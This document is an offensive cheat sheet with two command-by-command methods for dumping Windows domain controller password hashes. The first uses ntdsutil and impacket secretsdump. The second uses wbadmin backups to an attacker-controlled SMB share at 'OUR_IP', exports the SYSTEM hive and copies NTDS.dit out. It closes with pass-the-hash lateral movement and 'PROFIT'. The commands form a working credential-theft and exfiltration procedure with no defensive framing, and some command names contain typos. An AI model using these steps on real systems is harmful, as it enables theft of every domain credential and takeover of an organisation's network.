# DUMP DOMAIN CONTROLLER HASHES LOCALLY WITH NTDSUTIL

## required files: 

### 1) C:\windows\NTDS\ntds.dit

### 2) C:\windows\system32\config\SYSTEM

### 3) C:\windows\system32\config\SECURITY

#### 1) powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"

#### 2) Transfer them to attacking machine

#### 3) python3 Impacket-Secretsdump.py -security /path/to/SECURITY -system /path/to/SYSTEM -ntds path/to/ntds.dit local

# DUMP DOMAIN CONTROLLER HASHES WITH WBADMIN

#### 1) Create an new user that maches the "force user" parameter in the /etc/samba/smb.conf file:

#### adduser smbuser

#### smbpasswd -a smbuser

#### sudo service smbd restart 

#### 2) net use k: \\OUR_IP\SHARE /user:smbuser smbpass (Mount the share)

#### 3) echo "Y" | wbadmin start backup -backuptarget:\\OUR_IP\SHARE -include:c:\windows\ntds (Backup NTDS folder)

#### 4) sbadmin get versions (Retrieve the version of the backup)

#### 5) echo "Y" | wbadmin start recovery -version:10/01/2020-14:23 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl (Restore the NTDS file, specifying the backup version)

#### 6) reg save HKLM\SYSTEM C:\system.hive (Export the system hive)

#### 7) cp ntds.dit \\OUR_IP\SHARE\NTDS.dit

#### 8) cp system.hive \\OUR_IP\\SHARE\system.hive

#### 9) impacket-secretsdump -ntds NTDS.dit -system system.hive LOCAL

#### 10) Do a Pass-the-Hash attack with wmiexec/smbexec/psexec or evil-winrm 

#### 11) PROFIT
